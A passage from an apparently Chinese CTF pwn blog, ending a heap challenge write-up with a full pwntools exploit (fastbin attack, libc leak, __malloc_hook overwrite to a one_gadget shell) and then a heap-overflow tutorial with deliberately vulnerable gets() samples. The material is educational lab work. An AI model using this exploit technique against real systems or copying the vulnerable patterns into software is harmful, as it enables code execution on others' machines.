<p>这是把chunk4释放掉之后，可以看见其fd和bk都指向同一个地址，而这个地址是处于libc里面的地址，所以可以通过这个算出相对于libc起始地址的偏差，因为开启了pie保护，所以libc起始地址是会改变的，但是偏移却是一定的。</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418163308.png"></p>
<p>计算可知，偏移为0x3c4b78。偏移到手了，代表着one_gadget的绝对地址也已经有了，接下来就是找到个可以执行程序的东西，对ong_gadget执行即可获取shell。这里我们使用劫持__malloc_hook函数，这个函数是一个弱类型的函数指针，指向void *function(size_t size,void *caller)。当调用malloc函数的时候，会先判断hook函数指针是否为空，如果不为空，就调用它。所以我们要把hook函数指针修改为one_gadget的地址，进行调用one_gadget</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418170734.png"></p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418171155.png"></p>
<p>第二行就是我们需要覆盖的值，所以，我们要在他的前面创建chunk，然后堆溢出覆盖到目标地址。但是前面的数值过于巨大，fast bin的大小不过才0x20~0x80而已，所以这里要利用一个小技巧：错位偏移。即是不要对准内存，而这内存进行偏移0xd个位置，把开头的7f移动到末位，从而能申请到fast chunk。</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418175210.png"></p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418175119.png"></p>
<p>而在这里申请chunk跟之前差不多，先把之前释放的chunk4申请回来，作为fast chunk，我是申请了0x60的大小。然后再释放掉，归到fast bin去，然后通过2来修改其fd的值，去指向malloc_hook附近的地址，然后申请两次同样大小的chunk，第二个chunk就会在我们想要的地址。这里的偏移输入，因为先在hook的位置上移0x20-0xd处建chunk，那么前0x10用来标记，后面的才是存放数据，也就是我们输入数据的起始位置距离hook函数指针的偏移为0x10-0xd=0x3，相差3个字节，所以我们要用p(8)*3先填充这个偏差，然后才是真正的hook函数指针地址，再写入one_gadget的地址即可。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25412</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">allocate</span>(<span class="hljs-params">size</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.sendlineafter(<span class="hljs-string">&#x27;Content:&#x27;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&#x27;Command:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.recvline()<br>	<span class="hljs-keyword">return</span> p.recvline() <span class="hljs-comment">#接收堆中内容</span><br><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk0</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk1</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk2</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk3</span><br>allocate(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#chunk4</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>,payload)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>,payload)<br><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#chunk1</span><br>allocate(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#在chunk4上叠上了chunk2</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>,payload)<br>allocate(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#chunk5，防止chunk4与top chunk合并</span><br>free(<span class="hljs-number">4</span>)<br>leak_base=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>])<br>libc_base=leak_base-<span class="hljs-number">0x3c4b78</span><br>malloc_hook=libc_base+<span class="hljs-number">0x3c4b10</span><br>log.info(<span class="hljs-string">&quot;leak address:0x%x&quot;</span> %leak_base)<br>log.info(<span class="hljs-string">&quot;libc base:0x%x&quot;</span> %libc_base)<br>log.info(<span class="hljs-string">&quot;__malloc_hook:0x%x&quot;</span> %malloc_hook)<br><br>allocate(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">4</span>)<br>payload=p64(malloc_hook-<span class="hljs-number">0x20</span>+<span class="hljs-number">0xd</span>)<br>fill(<span class="hljs-number">2</span>,payload)<br>allocate(<span class="hljs-number">0x60</span>)<br><br>allocate(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#malloc附近的chunk6</span><br>one_gadget=libc_base+<span class="hljs-number">0x4526a</span><br><br>payload=p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(one_gadget)<br>fill(<span class="hljs-number">6</span>,payload)<br>allocate(<span class="hljs-number">0x1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<p>结语：总算艰苦的完成了第一道的堆题，其中的艰难就不再多说了。更多的还是喜悦吧，万事开头难，跨入了这道坎，后面可能也许大概会容易些吧</p>
]]></content>
  </entry>
  <entry>
    <title>初探堆</title>
    <url>/2021/04/10/2021-04-10-%E5%88%9D%E6%8E%A2%E5%A0%86/</url>
    <content><![CDATA[<h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><h4 id="知识来源处："><a href="#知识来源处：" class="headerlink" title="知识来源处："></a>知识来源处：</h4><ul>
<li>CTF pwn 中最通俗易懂的堆入坑指南<a href="https://www.anquanke.com/post/id/163971">https://www.anquanke.com/post/id/163971</a></li>
<li>CTF Wiki<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_overview-zh/">https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_overview-zh/</a></li>
</ul>
<h3 id="linux下的堆"><a href="#linux下的堆" class="headerlink" title="linux下的堆"></a>linux下的堆</h3><p>堆不同于栈，堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。栈是程序加载进内存后就会出现，而堆是由 malloc、alloc、realloc 函数分配内存后才会出现。</p>
<p>堆其实就是程序虚拟地址空间的一块连续的线性区域，其生长方向是从<strong>低地址向高地址生长的</strong>，与栈的从高地址向低地址生长是不同的。内核一般都会预先分配很大的一块连续的内存，因此堆可以申请到的内存空间比栈要大很多，然后让堆管理器通过某种算法管理这块内存。对堆操作的<strong>是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核</strong>。因为如果程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</p>
<p>目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p>
<h4 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h4><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">函数原型<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">brk</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *addr)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">sbrk</span><span class="hljs-params">(<span class="hljs-keyword">intptr_t</span> increment)</span></span>;<br></code></pre></td></tr></table></figure>

<p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk的大小来向操作系统申请内存。</p>
<p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p>
<ul>
<li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。</li>
<li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li>
</ul>
<p>brk和sbrk会改变program break的位置(在heap后的那块区域)，brk通过传递的addr来重新设置program break，成功则返回0，否则返回-1。而sbrk用来增加heap，增加的大小通过参数increment决定，返回增加大小<strong>前</strong>的heap的program break，如果increment为0则返回program break</p>
<p>大部分我们使用的是malloc和free函数来分配和释放内存，而brk和sbrk分配的堆空间类似于缓冲池（这个缓冲池的大小比malloc所设置的更大），每次malloc从缓冲池获得内存，如果缓冲池不够了，再调用brk或sbrk扩充缓冲池，直到达到缓冲池大小的上限，free则将应用程序使用的内存空间归还给缓冲池。</p>
<p><img src="/2021/04/10/2021-04-10-%E5%88%9D%E6%8E%A2%E5%A0%86/program_virtual_address_memory_space.png"></p>
<h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><p>malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。</p>
<p>可以用munmap函数清除mmap的匿名映射段</p>
<h4 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h4><p><strong>许多时候程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。</strong>我们称这一块连续的内存区域为 arena。此外，我们称由主线程申请的内存为main_arena。后续的申请的内存会一直从这个 arena 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p>
<p><strong>在主线程释放内存后</strong>，其对应的 arena 并没有进行回收，而是交由 glibc 来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。</p>
<p>注：当用户请求的内存大于 128KB 时，并且没有任何 arena 有足够的空间时，那么系统就会执行 mmap 函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</p>
<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>（转载自ctf-wiki<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/heapoverflow_basic-zh/%EF%BC%89">https://wiki.x10sec.org/pwn/linux/glibc-heap/heapoverflow_basic-zh/）</a></p>
<p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>），因而导致了数据溢出，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块。</p>
<p>不难发现，堆溢出漏洞发生的基本前提是</p>
<ul>
<li>程序向堆上写入数据。</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
<p>对于攻击者来说，堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。</p>
<p>堆溢出是一种特定的缓冲区溢出（还有栈溢出， bss 段溢出等）。但是其与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 EIP 。一般来说，我们利用堆溢出的策略是</p>
<ol>
<li>覆盖与其<strong>物理相邻的下一个 chunk</strong> 的内容。<ul>
<li>  prev_size</li>
<li>size，主要有三个比特位，以及该堆块真正的大小。<ul>
<li>  NON_MAIN_ARENA </li>
<li>  IS_MAPPED  </li>
<li>  PREV_INUSE </li>
<li>  the True chunk size</li>
</ul>
</li>
<li>  chunk content，从而改变程序固有的执行流。</li>
</ul>
</li>
<li> 利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</li>
</ol>
<h2 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h2><p>下面我们举一个简单的例子：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个程序的主要目的是调用 malloc 分配一块堆上的内存，之后向这个堆块中写入一个字符串，如果输入的字符串过长会导致溢出 chunk 的区域并覆盖到其后的 top chunk 之中(实际上 puts 内部会调用 malloc 分配堆内存，覆盖到的可能并不是 top chunk)。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x602000</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000021</span> &lt;===chunk<br><span class="hljs-attribute">0x602010</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x602020</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000020</span>fe<span class="hljs-number">1</span> &lt;===top chunk<br><span class="hljs-attribute">0x602030</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x602040</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br></code></pre></td></tr></table></figure>

<p>print ‘A’*100<br>进行写入</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x602000</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000021</span> &lt;===chunk<br><span class="hljs-attribute">0x602010</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span>	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span><br><span class="hljs-attribute">0x602020</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span>	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span> &lt;===top chunk(已被溢出)<br><span class="hljs-attribute">0x602030</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span>	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span><br><span class="hljs-attribute">0x602040</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span>	<span class="hljs-number">0</span>x<span class="hljs-number">4141414141414141</span><br></code></pre></td></tr></table></figure>


<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>堆溢出中比较重要的几个步骤:</p>
<h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><p>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-comment">//等同于</span><br>ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">memset</span>(ptr,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>);<br></code></pre></td></tr></table></figure>

<p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *chunk,*chunk1;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>  chunk1=<span class="hljs-built_in">realloc</span>(chunk,<span class="hljs-number">32</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>realloc的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作</p>
<ul>
<li>当realloc(ptr,size)的size不等于ptr的size时<ul>
<li>如果申请size&gt;原来size<ul>
<li>  如果chunk与top chunk相邻，直接扩展这个chunk到新size大小</li>
<li>  如果chunk与top chunk不相邻，相当于free(ptr),malloc(new_size) </li>
</ul>
</li>
<li>如果申请size&lt;原来size<ul>
<li>  如果相差不足以容得下一个最小chunk(64位下32个字节，32位下16个字节)，则保持不变</li>
<li>  如果相差可以容得下一个最小chunk，则切割原chunk为两部分，free掉后一部分</li>
</ul>
</li>
</ul>
</li>
<li>  当realloc(ptr,size)的size等于0时，相当于free(ptr)</li>
<li>  当realloc(ptr,size)的size等于ptr的size，不进行任何操作</li>
</ul>
<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。</p>
<p>常见的危险函数如下</p>
<ul>
<li>输入<ul>
<li>  gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li>
<li>  scanf</li>
<li>  vscanf</li>
</ul>
</li>
<li>输出<ul>
<li>  sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li>  strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li>
<li>  strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li>
<li>  bcopy，将字符串src的前n个字节复制到dest中，并且不检查’\x00’</li>
</ul>
</li>
</ul>
<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们开始写入的地址与我们所要覆盖的地址之间的距离</strong>。<br>一个常见的误区是malloc的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的2倍，比如32位系统是8个字节，64位系统是16个字节。但是对于不大于2倍字长的请求，malloc会直接返回2倍字长的块也就是最小chunk，比如64位系统执行<code>malloc(0)</code>会返回用户区域为16字节的块。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight dns"><table><tr><td class="code"><pre><code class="hljs dns">//根据系统的位数，malloc会分配<span class="hljs-number">8</span>或<span class="hljs-number">16</span>字节的用户空间<br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602010</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x0000000000020fe1<br><span class="hljs-number">0x602030</span>:	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>	<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure>

<p>注意用户区域的大小不等于 chunk_hear.size，chunk_hear.size=用户区域大小+2*字长</p>
<p>还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个chunk的prev_size字段储存内容。回头再来看下之前的示例代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  <span class="hljs-built_in">gets</span>(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>观察如上代码，我们申请的chunk大小是24个字节。但是我们将其编译为64位可执行程序时，实际上分配的内存会是16个字节而不是24个。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x602000</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000021</span><br><span class="hljs-attribute">0x602010</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span><br><span class="hljs-attribute">0x602020</span>:	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000000000</span>	<span class="hljs-number">0</span>x<span class="hljs-number">0000000000020</span>fe<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>16个字节的空间是如何装得下24个字节的内容呢？答案是借用了下一个块的pre_size域。我们可来看一下用户申请的内存大小与glibc中实际分配的内存大小之间的转换。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> request2size(req)                                                      \</span><br><span class="hljs-meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="hljs-meta">         ? MINSIZE                                                             \</span><br><span class="hljs-meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></code></pre></td></tr></table></figure>

<p>当req=24时，request2size(24)=32。而除去chunk 头部的16个字节。实际上用户可用chunk的字节数为16。而根据我们前面学到的知识可以知道chunk的pre_size仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个chunk的prev_size字段，正好24个字节。<strong>实际上 ptmalloc 分配内存是以双字为基本单位，以64位系统为例，分配出来的空间是16的整数倍，即用户申请的chunk都是16字节对齐的。</strong></p>
<h2 id="相关函数知识"><a href="#相关函数知识" class="headerlink" title="相关函数知识"></a>相关函数知识</h2><p>1、<strong>mmap</strong></p>
<p>函数原型为<em><em>void</em> mmap(void</em> start,size_t length,int prot,int flags,int fd,off_t offset)**  功能为：mmap将一个文件或者其它对象映射进内存。文件被<strong>映射</strong>到多个页上，如果文件的大小不是所有页的大小之和，最后一个页剩下的空间（未使用的）将会清零。mmap创建的chunk紧邻libc</p>
<p>条件：mmap()必须以PAGE_SIZE为单位进行映射，而内存也只能以页为单位（32位系统中页为4k字节）进行映射，若要映射非PAGE_SIZE整数倍的地址范围，要先进行内存对齐，强行以PAGE_SIZE的倍数大小进行映射。</p>
<p>参数说明：</p>
<p>start：映射区的开始地址，设置为0时表示由系统决定映射区的起始地址。</p>
<p>length：映射区的长度。//长度单位是 以字节为单位，不足一内存页按一内存页处理</p>
<p>prot：期望的内存保护标志，不能与文件的打开模式冲突。是以下的某个值，可以通过or运算合理地组合在一起</p>
<p>PROT_EXEC //页内容可以被执行（值为1）</p>
<p>PROT_READ //页内容可以被读取（值为4）</p>
<p>PROT_WRITE //页可以被写入（值为2）</p>
<p>PROT_NONE //页不可访问</p>
<p>flags：指定映射对象的类型，映射选项和映射页是否可以共享。它的值可以是一个或者多个以下位的组合体：</p>
<p>MAP_FIXED //使用指定的映射起始地址，如果由start和len参数指定的内存区重叠于现存的映射空间，重叠部分将会被丢弃。如果指定的起始地址不可用，操作将会失败。并且起始地址必须落在页的边界上。</p>
<p>MAP_SHARED //与其它所有映射这个对象的进程共享映射空间。对共享区的写入，相当于输出到文件。直到**msync()<strong>或者</strong>munmap()**被调用，文件实际上不会被更新。</p>
<p>MAP_PRIVATE //建立一个写入时拷贝的私有映射。内存区域的写入不会影响到原文件。这个标志和以上标志是互斥的，只能使用其中一个。</p>
<p>MAP_DENYWRITE //这个标志被忽略。</p>
<p>MAP_EXECUTABLE //同上</p>
<p>MAP_NORESERVE //不要为这个映射保留交换空间。当交换空间被保留，对映射区修改的可能会得到保证。当交换空间不被保留，同时内存不足，对映射区的修改会引起段违例信号。</p>
<p>MAP_LOCKED //锁定映射区的页面，从而防止页面被交换出内存。</p>
<p>MAP_GROWSDOWN //用于堆栈，告诉内核VM系统，映射区可以向下扩展。</p>
<p>MAP_ANONYMOUS //匿名映射，映射区不与任何文件关联。</p>
<p>MAP_ANON //MAP_ANONYMOUS的别称，不再被使用。</p>
<p>MAP_FILE //兼容标志，被忽略。</p>
<p>MAP_32BIT //将映射区放在进程地址空间的低2GB，MAP_FIXED指定时会被忽略。当前这个标志只在x86-64平台上得到支持。</p>
<p>MAP_POPULATE //为文件映射通过预读的方式准备好页表。随后对映射区的访问不会被页违例阻塞。</p>
<p>MAP_NONBLOCK //仅和MAP_POPULATE一起使用时才有意义。不执行预读，只为已存在于内存中的页面建立页表入口。</p>
<p>fd：有效的文件描述词。一般是由**open()**函数返回，其值可以设置为-1，此时需要指定flags参数中的MAP_ANONYMOUS，表明进行的是匿名映射。</p>
